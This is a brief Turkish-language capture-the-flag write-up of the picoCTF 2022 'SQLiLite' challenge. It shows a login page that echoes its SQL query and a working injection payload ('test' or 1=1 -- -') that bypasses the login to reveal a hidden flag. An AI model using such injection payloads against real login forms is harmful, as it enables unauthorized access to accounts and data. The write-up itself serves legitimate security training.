---
title: 'picoCTF 2022 | SQLiLite WriteUp'
author: 'appdone'
categories: [picoCTF 2022 Challenges]
tags: [sql injection, login bypass]
render_with_liquid: false
---

Web uygulamasını açtığımızda bir giriş sayfası ile karşılaşıyoruz. Rastgele bilgiler girdikten sonra ise aşağıdaki yazıların bulunduğu bir sayfa ile karşılaşıyoruz.

```
username: appdone
password: appdone
SQL query: SELECT * FROM users WHERE name='appdone' AND password='appdone'
Login failed.
```

Girdiğimiz kullanıcı bilgileri ile beraber SQL sorgusu da veriliyor. Sorguda "user" tablosunda girdiğimiz kullanıcı adı ve parolası ile eşleşen bir kolon olup olmadığını kontrol ediyor. Bu durumda kullanıcı adı alanına "test' or 1=1 -- -" kodunu girdiğimde başarıyla giriş yapmış olacağım.

```
<pre>username: test&#039; or 1=1 -- -
password: appdone
SQL query: SELECT * FROM users WHERE name=&#039;test&#039; or 1=1 -- -&#039; AND password=&#039;appdone&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{***}</p>
```
